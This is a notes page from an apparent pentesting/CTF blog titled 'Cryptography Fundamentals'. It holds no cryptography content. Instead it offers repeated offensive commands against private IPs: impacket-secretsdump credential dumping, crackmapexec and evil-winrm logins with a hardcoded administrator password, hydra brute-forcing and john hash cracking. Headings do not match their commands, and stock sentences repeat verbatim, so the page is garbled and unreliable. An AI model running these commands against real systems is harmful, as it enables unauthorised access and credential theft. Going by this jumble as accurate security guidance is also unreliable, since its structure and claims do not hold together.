---
TitleSEO: "Cryptography Fundamentals | ZureFX"
TitlePost: "Cryptography Fundamentals"
Author: "ZureFX"
Description: "Personal notes on Cryptography Fundamentals. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, blue team, persistence, lateral movement, linux"
URL: "https://zurefx.github.io/notes/note-cryptography-fundamentals-261.html"
URL_IMAGES: ""
Date: "2024-06-08"
Tags: "Enumeration, Blue Team, Persistence, Lateral Movement, Linux"
Section: "notes"
Lang: "en"
main_img: "note-cryptography-fundamentals-261"
Permalink: "/notes/note-cryptography-fundamentals-261.html"
BtnLabel: "Read Notes"
Pick: 0
---
## enum4linux

### secretsdump

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
crackmapexec smb 10.48.139.135 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.25.133.205
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.81.7.95 -u administrator -p 'P@ssw0rd!' --shares
```

```bash
crackmapexec smb 10.35.41.45 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.107.202.241/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.120.105.87
evil-winrm -i 10.69.230.152 -u administrator -p 'P@ssw0rd!'
```

## XXE

### Subdomain Takeover

```bash
gobuster dir -u http://10.107.155.219/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.118.117/FUZZ
feroxbuster -h
```

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.97.197 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
evil-winrm -i 10.26.64.116 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.41.235.58 -u administrator -p 'P@ssw0rd!' --shares
```

- `evil-winrm`
- `Pass the Ticket`
- `rpcclient`

## Java

### gobuster

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

- `SeImpersonatePrivilege`
- `Command Injection`
- `kerbrute`
- `LXD Privilege Escalation`

## smbexec

### ligolo-ng

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Laravel

### bloodhound

```bash
crackmapexec smb 10.20.86.178 -u administrator -p 'P@ssw0rd!' --shares
```

- `hashcat`
- `evil-winrm`
- `SSRF`
- `chisel`
- `SeImpersonatePrivilege`

## msfvenom

### Flask

```bash
gobuster dir -u http://10.22.172.116/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.30.166.97 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.44.190.162 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.63.35.69
```
